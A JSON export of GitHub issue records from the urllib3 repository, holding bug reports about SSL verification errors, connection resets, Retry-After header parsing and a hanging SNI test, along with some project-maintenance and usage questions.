"https://api.github.com/users/WayneZeng/following{/other_user}", "gists_url": "https://api.github.com/users/WayneZeng/gists{/gist_id}", "starred_url": "https://api.github.com/users/WayneZeng/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/WayneZeng/subscriptions", "organizations_url": "https://api.github.com/users/WayneZeng/orgs", "repos_url": "https://api.github.com/users/WayneZeng/repos", "events_url": "https://api.github.com/users/WayneZeng/events{/privacy}", "received_events_url": "https://api.github.com/users/WayneZeng/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-04-26T13:32:22Z", "updated_at": "2020-04-27T02:48:53Z", "closed_at": "2020-04-26T14:56:59Z", "author_association": "NONE", "active_lock_reason": null, "body": "import urllib3\r\nhttp = urllib3.PoolManager(num_pools=1, maxsize=1, block=False)\r\nr = http.request('GET', 'https://google.com')\r\n\r\nevironment:\r\nmac os\r\npython 3.6.5\r\ncertifi==2018.4.16(the lastest version 2020.4.5.1 is also failed)\r\nurllib3==1.25.7\r\n\r\nthe traceback is:\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/urllib3/request.py\", line 76, in request\r\n    method, url, fields=fields, headers=headers, **urlopen_kw\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/urllib3/request.py\", line 97, in request_encode_url\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/urllib3/poolmanager.py\", line 336, in urlopen\r\n    response = conn.urlopen(method, u.request_uri, **kw)\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/urllib3/connectionpool.py\", line 765, in urlopen\r\n    **response_kw\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/urllib3/connectionpool.py\", line 765, in urlopen\r\n    **response_kw\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/urllib3/connectionpool.py\", line 765, in urlopen\r\n    **response_kw\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/urllib3/connectionpool.py\", line 725, in urlopen\r\n    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/urllib3/util/retry.py\", line 439, in increment\r\n    raise MaxRetryError(_pool, url, error or ResponseError(cause))\r\nurllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='google.com', port=443): Max retries exceeded with url: / (Caused by SSLError(SSLError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:833)'),))\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1854", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1854/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1854/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1854/events", "html_url": "https://github.com/urllib3/urllib3/issues/1854", "id": 601184070, "node_id": "MDU6SXNzdWU2MDExODQwNzA=", "number": 1854, "title": "Raw HTML in README.rst causing problems with uploading dists", "user": {"login": "sethmlarson", "id": 18519037, "node_id": "MDQ6VXNlcjE4NTE5MDM3", "avatar_url": "https://avatars0.githubusercontent.com/u/18519037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sethmlarson", "html_url": "https://github.com/sethmlarson", "followers_url": "https://api.github.com/users/sethmlarson/followers", "following_url": "https://api.github.com/users/sethmlarson/following{/other_user}", "gists_url": "https://api.github.com/users/sethmlarson/gists{/gist_id}", "starred_url": "https://api.github.com/users/sethmlarson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sethmlarson/subscriptions", "organizations_url": "https://api.github.com/users/sethmlarson/orgs", "repos_url": "https://api.github.com/users/sethmlarson/repos", "events_url": "https://api.github.com/users/sethmlarson/events{/privacy}", "received_events_url": "https://api.github.com/users/sethmlarson/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-04-16T15:45:12Z", "updated_at": "2020-04-16T18:50:23Z", "closed_at": "2020-04-16T18:50:23Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "See: https://travis-ci.org/github/urllib3/urllib3/builds/675807537\r\n\r\nFor now I've manually uploaded the dists.\r\n\r\nWe should strip this section from our `long_description` field and maybe run `twine check` within our CI to make sure we don't run into this issue on release time in the future.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1849", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1849/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1849/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1849/events", "html_url": "https://github.com/urllib3/urllib3/issues/1849", "id": 599697857, "node_id": "MDU6SXNzdWU1OTk2OTc4NTc=", "number": 1849, "title": "Jython 2.7.2 SSLError, internal error", "user": {"login": "lukicsl", "id": 23736716, "node_id": "MDQ6VXNlcjIzNzM2NzE2", "avatar_url": "https://avatars2.githubusercontent.com/u/23736716?v=4", "gravatar_id": "", "url": "https://api.github.com/users/lukicsl", "html_url": "https://github.com/lukicsl", "followers_url": "https://api.github.com/users/lukicsl/followers", "following_url": "https://api.github.com/users/lukicsl/following{/other_user}", "gists_url": "https://api.github.com/users/lukicsl/gists{/gist_id}", "starred_url": "https://api.github.com/users/lukicsl/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lukicsl/subscriptions", "organizations_url": "https://api.github.com/users/lukicsl/orgs", "repos_url": "https://api.github.com/users/lukicsl/repos", "events_url": "https://api.github.com/users/lukicsl/events{/privacy}", "received_events_url": "https://api.github.com/users/lukicsl/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-04-14T16:23:20Z", "updated_at": "2020-04-15T00:30:22Z", "closed_at": "2020-04-15T00:30:21Z", "author_association": "NONE", "active_lock_reason": null, "body": "Jython has a problem with ssl:\r\nThis might be an issue at Jython, please give your guess\r\n\r\n```\r\nroot@34b4e3a1e41b:/# python\r\nJython 2.7.2 (v2.7.2:925a3cc3b49d, Mar 21 2020, 10:03:58)\r\n[OpenJDK Server VM (AdoptOpenJDK)] on java14\r\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r\n>>> import urllib3\r\n>>> http = urllib3.PoolManager()\r\n>>> r = http.request('GET', 'http://api.eiswarnung.de/')\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"/usr/local/jython/Lib/site-packages/urllib3/request.py\", line 75, in request\r\n    return self.request_encode_url(\r\n  File \"/usr/local/jython/Lib/site-packages/urllib3/request.py\", line 97, in request_encode_url\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/usr/local/jython/Lib/site-packages/urllib3/poolmanager.py\", line 369, in urlopen\r\n    return self.urlopen(method, redirect_location, **kw)\r\n  File \"/usr/local/jython/Lib/site-packages/urllib3/poolmanager.py\", line 330, in urlopen\r\n    response = conn.urlopen(method, u.request_uri, **kw)\r\n  File \"/usr/local/jython/Lib/site-packages/urllib3/connectionpool.py\", line 747, in urlopen\r\n    return self.urlopen(\r\n  File \"/usr/local/jython/Lib/site-packages/urllib3/connectionpool.py\", line 747, in urlopen\r\n    return self.urlopen(\r\n  File \"/usr/local/jython/Lib/site-packages/urllib3/connectionpool.py\", line 719, in urlopen\r\n    retries = retries.increment(\r\n  File \"/usr/local/jython/Lib/site-packages/urllib3/util/retry.py\", line 436, in increment\r\n    raise MaxRetryError(_pool, url, error or ResponseError(cause))\r\nurllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='www.eiswarnung.de', port=443): Max retries exceeded with url: /api/public/ (Caused by SSLError(SSLError(1, u'Received fatal alert: internal_error'),))\r\n>>> \r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1848", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1848/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1848/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1848/events", "html_url": "https://github.com/urllib3/urllib3/issues/1848", "id": 597696261, "node_id": "MDU6SXNzdWU1OTc2OTYyNjE=", "number": 1848, "title": "How to translate a web page into English before scraping?", "user": {"login": "Jainu-s", "id": 59506207, "node_id": "MDQ6VXNlcjU5NTA2MjA3", "avatar_url": "https://avatars3.githubusercontent.com/u/59506207?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Jainu-s", "html_url": "https://github.com/Jainu-s", "followers_url": "https://api.github.com/users/Jainu-s/followers", "following_url": "https://api.github.com/users/Jainu-s/following{/other_user}", "gists_url": "https://api.github.com/users/Jainu-s/gists{/gist_id}", "starred_url": "https://api.github.com/users/Jainu-s/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Jainu-s/subscriptions", "organizations_url": "https://api.github.com/users/Jainu-s/orgs", "repos_url": "https://api.github.com/users/Jainu-s/repos", "events_url": "https://api.github.com/users/Jainu-s/events{/privacy}", "received_events_url": "https://api.github.com/users/Jainu-s/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-04-10T05:01:33Z", "updated_at": "2020-04-10T05:32:22Z", "closed_at": "2020-04-10T05:32:22Z", "author_association": "NONE", "active_lock_reason": null, "body": "I have a list of website URL's and I'm doing web scraping using 'urllib' library. Few websites are of different or in their native language and my function cannot scrape those websites. How to convert those web pages to English language before scraping the data.\r\n\r\n```\r\ndef dataextraction():\r\n\r\n    for url in urls:\r\n        final_url = 'http://' + url\r\n        try:\r\n            html = urllib.request.urlopen(final_url).read().decode('utf-8')\r\n            text = get_text(html)\r\n            extracted_data = text.split()\r\n            refined_data = []\r\n            SYMBOLS = '{}()[].,:;+-*/&|<>=~0123456789'\r\n            for i in extracted_data:\r\n                if i not in SYMBOLS:\r\n                    refined_data.append(i)\r\n            print(\"\\n\", \"$\" * 50, \"HEYAAA we got arround: \", len(refined_data), \" of keywords! Here are they: \",\r\n                  \"$\" * 50, \"\\n\")\r\n            print(refined_data)\r\n\r\n        except:\r\n            pass\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1842", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1842/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1842/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1842/events", "html_url": "https://github.com/urllib3/urllib3/issues/1842", "id": 595597786, "node_id": "MDU6SXNzdWU1OTU1OTc3ODY=", "number": 1842, "title": "Switch to Sphinx 3", "user": {"login": "pquentin", "id": 42327, "node_id": "MDQ6VXNlcjQyMzI3", "avatar_url": "https://avatars1.githubusercontent.com/u/42327?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pquentin", "html_url": "https://github.com/pquentin", "followers_url": "https://api.github.com/users/pquentin/followers", "following_url": "https://api.github.com/users/pquentin/following{/other_user}", "gists_url": "https://api.github.com/users/pquentin/gists{/gist_id}", "starred_url": "https://api.github.com/users/pquentin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pquentin/subscriptions", "organizations_url": "https://api.github.com/users/pquentin/orgs", "repos_url": "https://api.github.com/users/pquentin/repos", "events_url": "https://api.github.com/users/pquentin/events{/privacy}", "received_events_url": "https://api.github.com/users/pquentin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-04-07T05:18:05Z", "updated_at": "2020-04-08T18:09:51Z", "closed_at": "2020-04-08T18:09:51Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "Here's the changelog: https://www.sphinx-doc.org/en/master/changes.html#release-3-0-0-released-apr-06-2020\r\n\r\nIt currently fails with an mysterious `ValueError: wrapper loop when unwrapping <MockModule id='139897808864312'>` error: https://travis-ci.org/github/urllib3/urllib3/jobs/671484869", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1835", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1835/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1835/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1835/events", "html_url": "https://github.com/urllib3/urllib3/issues/1835", "id": 590948597, "node_id": "MDU6SXNzdWU1OTA5NDg1OTc=", "number": 1835, "title": "Commercial Usage Rights", "user": {"login": "hi2rashid", "id": 10250923, "node_id": "MDQ6VXNlcjEwMjUwOTIz", "avatar_url": "https://avatars1.githubusercontent.com/u/10250923?v=4", "gravatar_id": "", "url": "https://api.github.com/users/hi2rashid", "html_url": "https://github.com/hi2rashid", "followers_url": "https://api.github.com/users/hi2rashid/followers", "following_url": "https://api.github.com/users/hi2rashid/following{/other_user}", "gists_url": "https://api.github.com/users/hi2rashid/gists{/gist_id}", "starred_url": "https://api.github.com/users/hi2rashid/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/hi2rashid/subscriptions", "organizations_url": "https://api.github.com/users/hi2rashid/orgs", "repos_url": "https://api.github.com/users/hi2rashid/repos", "events_url": "https://api.github.com/users/hi2rashid/events{/privacy}", "received_events_url": "https://api.github.com/users/hi2rashid/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-03-31T09:34:40Z", "updated_at": "2020-03-31T09:36:03Z", "closed_at": "2020-03-31T09:36:03Z", "author_association": "NONE", "active_lock_reason": null, "body": "We are using this urllib3 in our python project.\r\n\r\nplease confirm if its allowed to use this for commercial projects", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1826", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1826/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1826/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1826/events", "html_url": "https://github.com/urllib3/urllib3/issues/1826", "id": 585631533, "node_id": "MDU6SXNzdWU1ODU2MzE1MzM=", "number": 1826, "title": "10054 issue", "user": {"login": "jasonyun", "id": 738056, "node_id": "MDQ6VXNlcjczODA1Ng==", "avatar_url": "https://avatars1.githubusercontent.com/u/738056?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jasonyun", "html_url": "https://github.com/jasonyun", "followers_url": "https://api.github.com/users/jasonyun/followers", "following_url": "https://api.github.com/users/jasonyun/following{/other_user}", "gists_url": "https://api.github.com/users/jasonyun/gists{/gist_id}", "starred_url": "https://api.github.com/users/jasonyun/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jasonyun/subscriptions", "organizations_url": "https://api.github.com/users/jasonyun/orgs", "repos_url": "https://api.github.com/users/jasonyun/repos", "events_url": "https://api.github.com/users/jasonyun/events{/privacy}", "received_events_url": "https://api.github.com/users/jasonyun/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-03-22T02:40:30Z", "updated_at": "2020-03-23T05:47:53Z", "closed_at": "2020-03-23T05:47:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "```\r\nTraceback (most recent call last):\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\urllib3\\connectionpool.py\", line 665, in urlopen      \r\n    httplib_response = self._make_request(\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\urllib3\\connectionpool.py\", line 421, in _make_request\r\n    six.raise_from(e, None)\r\n  File \"<string>\", line 3, in raise_from\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\urllib3\\connectionpool.py\", line 416, in _make_request\r\n    httplib_response = conn.getresponse()\r\n  File \"c:\\users\\a\\appdata\\local\\programs\\python\\python38\\lib\\http\\client.py\", line 1322, in getresponse\r\n    response.begin()\r\n  File \"c:\\users\\a\\appdata\\local\\programs\\python\\python38\\lib\\http\\client.py\", line 303, in begin       \r\n    version, status, reason = self._read_status()\r\n  File \"c:\\users\\a\\appdata\\local\\programs\\python\\python38\\lib\\http\\client.py\", line 264, in _read_status\r\n    line = str(self.fp.readline(_MAXLINE + 1), \"iso-8859-1\")\r\n  File \"c:\\users\\a\\appdata\\local\\programs\\python\\python38\\lib\\socket.py\", line 669, in readinto\r\n    return self._sock.recv_into(b)\r\nConnectionResetError: [WinError 10054] \u8fdc\u7a0b\u4e3b\u673a\u5f3a\u8feb\u5173\u95ed\u4e86\u4e00\u4e2a\u73b0\u6709\u7684\u8fde\u63a5\u3002\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n  File \"e:\\Dropbox\\17.Develop\\5.Project\\autozboa\\run.py\", line 22, in <module>\r\n    manage()\r\n  File \"e:\\Dropbox\\17.Develop\\5.Project\\autozboa\\run.py\", line 14, in manage\r\n    m.handle_doc()  # \u5904\u7406\u5355\u4e2a\u6587\u4ef6\r\n  File \"e:\\Dropbox\\17.Develop\\5.Project\\autozboa\\manage.py\", line 67, in handle_doc\r\n    docs_unid = docs.get_docs_unid()\r\n  File \"e:\\Dropbox\\17.Develop\\5.Project\\autozboa\\zboa\\pages\\docs_page.py\", line 38, in get_docs_unid\r\n    for doc in self.find_elements(*self.docs_link):\r\n  File \"e:\\Dropbox\\17.Develop\\5.Project\\autozboa\\zboa\\framework\\base_page.py\", line 70, in find_elements\r\n    elements = self.driver.find_elements(*selector)\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\selenium\\webdriver\\remote\\webdriver.py\", line 1005, in find_elements\r\n    return self.execute(Command.FIND_ELEMENTS, {\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\selenium\\webdriver\\remote\\webdriver.py\", line 319, in execute       \r\n    response = self.command_executor.execute(driver_command, params)\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\selenium\\webdriver\\remote\\remote_connection.py\", line 374, in execute\r\n    return self._request(command_info[0], url, body=data)\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\selenium\\webdriver\\remote\\remote_connection.py\", line 402, in _request\r\n    resp = http.request(method, url, body=body, headers=headers)\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\urllib3\\request.py\", line 79, in request\r\n    return self.request_encode_body(\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\urllib3\\request.py\", line 171, in request_encode_body\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\urllib3\\poolmanager.py\", line 330, in urlopen\r\n    response = conn.urlopen(method, u.request_uri, **kw)\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\urllib3\\connectionpool.py\", line 719, in urlopen\r\n    retries = retries.increment(\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\urllib3\\util\\retry.py\", line 400, in increment\r\n    raise six.reraise(type(error), error, _stacktrace)\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\urllib3\\packages\\six.py\", line 734, in reraise\r\n    raise value.with_traceback(tb)\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\urllib3\\connectionpool.py\", line 665, in urlopen\r\n    httplib_response = self._make_request(\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\urllib3\\connectionpool.py\", line 421, in _make_request\r\n    six.raise_from(e, None)\r\n  File \"<string>\", line 3, in raise_from\r\n  File \"E:\\Dropbox\\17.Develop\\5.Project\\autozboa\\env\\lib\\site-packages\\urllib3\\connectionpool.py\", line 416, in _make_request\r\n    httplib_response = conn.getresponse()\r\n  File \"c:\\users\\a\\appdata\\local\\programs\\python\\python38\\lib\\http\\client.py\", line 1322, in getresponse\r\n    response.begin()\r\n  File \"c:\\users\\a\\appdata\\local\\programs\\python\\python38\\lib\\http\\client.py\", line 303, in begin\r\n    version, status, reason = self._read_status()\r\n  File \"c:\\users\\a\\appdata\\local\\programs\\python\\python38\\lib\\http\\client.py\", line 264, in _read_status\r\n    line = str(self.fp.readline(_MAXLINE + 1), \"iso-8859-1\")\r\n  File \"c:\\users\\a\\appdata\\local\\programs\\python\\python38\\lib\\socket.py\", line 669, in readinto\r\n    return self._sock.recv_into(b)\r\nurllib3.exceptions.ProtocolError: ('Connection aborted.', ConnectionResetError(10054, '\u8fdc\u7a0b\u4e3b\u673a\u5f3a\u8feb\u5173\u95ed\u4e86\u4e00\u4e2a\u73b0\u6709\u7684\u8fde\u63a5\u3002', None, 10054, None))\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1822", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1822/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1822/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1822/events", "html_url": "https://github.com/urllib3/urllib3/issues/1822", "id": 584454725, "node_id": "MDU6SXNzdWU1ODQ0NTQ3MjU=", "number": 1822, "title": " InvalidHeader: Invalid Retry-After header: 1m0s with github.com", "user": {"login": "ssbarnea", "id": 102495, "node_id": "MDQ6VXNlcjEwMjQ5NQ==", "avatar_url": "https://avatars3.githubusercontent.com/u/102495?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ssbarnea", "html_url": "https://github.com/ssbarnea", "followers_url": "https://api.github.com/users/ssbarnea/followers", "following_url": "https://api.github.com/users/ssbarnea/following{/other_user}", "gists_url": "https://api.github.com/users/ssbarnea/gists{/gist_id}", "starred_url": "https://api.github.com/users/ssbarnea/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ssbarnea/subscriptions", "organizations_url": "https://api.github.com/users/ssbarnea/orgs", "repos_url": "https://api.github.com/users/ssbarnea/repos", "events_url": "https://api.github.com/users/ssbarnea/events{/privacy}", "received_events_url": "https://api.github.com/users/ssbarnea/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 14, "created_at": "2020-03-19T14:30:58Z", "updated_at": "2020-04-22T10:37:15Z", "closed_at": "2020-03-27T12:35:26Z", "author_association": "NONE", "active_lock_reason": null, "body": "Apparently retry logic inside urllib3 chokes when receiving 429 replies from github itself.\r\n```\r\nself = Retry(total=2, connect=None, read=None, redirect=None, status=None)\r\nretry_after = '1m0s'\r\n\r\n    def parse_retry_after(self, retry_after):\r\n        # Whitespace: https://tools.ietf.org/html/rfc7230#section-3.2.4\r\n        if re.match(r\"^\\s*[0-9]+\\s*$\", retry_after):\r\n            seconds = int(retry_after)\r\n        else:\r\n            retry_date_tuple = email.utils.parsedate(retry_after)\r\n            if retry_date_tuple is None:\r\n>               raise InvalidHeader(\"Invalid Retry-After header: %s\" % retry_after)\r\nE               InvalidHeader: Invalid Retry-After header: 1m0s\r\n```\r\n\r\nEven more interesting, the `parsedate` is now no longer part of the stdlib, https://github.com/urllib3/urllib3/blob/728d9244665ef5b03103cb74d7b409ebe4f23b43/src/urllib3/util/retry.py#L254\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1818", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1818/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1818/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1818/events", "html_url": "https://github.com/urllib3/urllib3/issues/1818", "id": 583713698, "node_id": "MDU6SXNzdWU1ODM3MTM2OTg=", "number": 1818, "title": "TestSNI:test_hostname_in_first_request_packet hangs", "user": {"login": "hodbn", "id": 2493157, "node_id": "MDQ6VXNlcjI0OTMxNTc=", "avatar_url": "https://avatars3.githubusercontent.com/u/2493157?v=4", "gravatar_id": "", "url": "https://api.github.com/users/hodbn", "html_url": "https://github.com/hodbn", "followers_url": "https://api.github.com/users/hodbn/followers", "following_url": "https://api.github.com/users/hodbn/following{/other_user}", "gists_url": "https://api.github.com/users/hodbn/gists{/gist_id}", "starred_url": "https://api.github.com/users/hodbn/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/hodbn/subscriptions", "organizations_url": "https://api.github.com/users/hodbn/orgs", "repos_url": "https://api.github.com/users/hodbn/repos", "events_url": "https://api.github.com/users/hodbn/events{/privacy}", "received_events_url": "https://api.github.com/users/hodbn/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2020-03-18T13:04:47Z", "updated_at": "2020-03-20T06:27:05Z", "closed_at": "2020-03-20T06:27:05Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "My system supports IPv6 and resolves `localhost` to `127.0.0.1`.\r\nWhen I run the test suite on my system, `TestSNI:test_hostname_in_first_request_packet` hangs.\r\nThis also fail about 80 more tests with `MaxRetryError`.\r\n\r\n### Expected Result\r\n1. The test should pass.\r\n2. The test should never hang.\r\n\r\n### Actual Result\r\nThe test uses `_start_server` to create a `SocketServerThread` that binds on an IPv6 address by default (if possible):\r\n```python\r\n 70 HAS_IPV6_AND_DNS = _has_ipv6(\"localhost\")\r\n...\r\n 90     USE_IPV6 = HAS_IPV6_AND_DNS\r\n...\r\n101         if self.USE_IPV6:\r\n102             sock = socket.socket(socket.AF_INET6)\r\n```\r\nbut the client connection might still resolve to IPv4 address and use it:\r\n```python\r\n 61     for res in socket.getaddrinfo(host, port, family, socket.SOCK_STREAM):\r\n 62         af, socktype, proto, canonname, sa = res\r\n 63         sock = None\r\n 64         try:\r\n 65             sock = socket.socket(af, socktype, proto)\r\n...\r\n103     if HAS_IPV6:\r\n104         family = socket.AF_UNSPEC\r\n```\r\nThe test waits until an event is set, which is never, because the server socket never gets accepted.\r\n\r\n### Reproduction Steps\r\n```\r\n$ cat noxfile-single.patch\r\n30a31,32\r\n>         \"-o\", \"log_cli=true\",\r\n>         \"-k\", \"test_hostname_in_first_request_packet\",\r\n$ patch noxfile.py noxfile-single.patch\r\npatching file noxfile.py\r\n$ nox --sessions test-2.7\r\nnox > Running session test-2.7\r\nnox > Creating virtual environment (virtualenv) using python2.7 in .nox/test-2-7\r\nnox > pip install -r dev-requirements.txt\r\nnox > pip install .[socks,secure,brotli]\r\nnox > pip --version\r\npip 20.0.2 from /home/user/dev/urllib3/.nox/test-2-7/lib/python2.7/site-packages/pip (python 2.7)\r\nnox > python --version\r\nPython 2.7.17\r\nnox > python -c import struct; print(struct.calcsize('P') * 8)\r\n64\r\nnox > python -m OpenSSL.debug\r\npyOpenSSL: 19.1.0\r\ncryptography: 2.8\r\ncffi: 1.14.0\r\ncryptography's compiled against OpenSSL: OpenSSL 1.1.1d  10 Sep 2019\r\ncryptography's linked OpenSSL: OpenSSL 1.1.1d  10 Sep 2019\r\nPythons's OpenSSL: OpenSSL 1.1.1  11 Sep 2018\r\nPython executable: /home/user/dev/urllib3/.nox/test-2-7/bin/python\r\nPython version: 2.7.17 (default, Nov  7 2019, 10:07:09)\r\n[GCC 7.4.0]\r\nPlatform: linux2\r\nsys.path: ['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/home/user/dev/urllib3/.nox/test-2-7/lib/python2.7/site-packages']\r\nnox > coverage run --parallel-mode -m pytest -o log_cli=true -k test_hostname_in_first_request_packet -r a --tb=native --no-success-flaky-report test/\r\n==================================== test session starts ====================================\r\nplatform linux2 -- Python 2.7.17, pytest-4.6.6, py-1.8.1, pluggy-0.13.1\r\nrootdir: /home/user/dev/urllib3, inifile: setup.cfg\r\nplugins: flaky-3.6.1, timeout-1.3.3\r\ncollected 1342 items / 1339 deselected / 3 selected\r\n\r\ntest/contrib/test_pyopenssl.py::TestSNI::test_hostname_in_first_request_packet\r\n[hangs]\r\n```\r\n\r\n### System Information\r\n```\r\n$ git rev-parse --short HEAD\r\neee53a69\r\n$ cat /etc/hosts\r\n127.0.0.1       localhost\r\n127.0.1.1       ubuntu\r\n\r\n# The following lines are desirable for IPv6 capable hosts\r\n::1     ip6-localhost ip6-loopback\r\nfe00::0 ip6-localnet\r\nff00::0 ip6-mcastprefix\r\nff02::1 ip6-allnodes\r\nff02::2 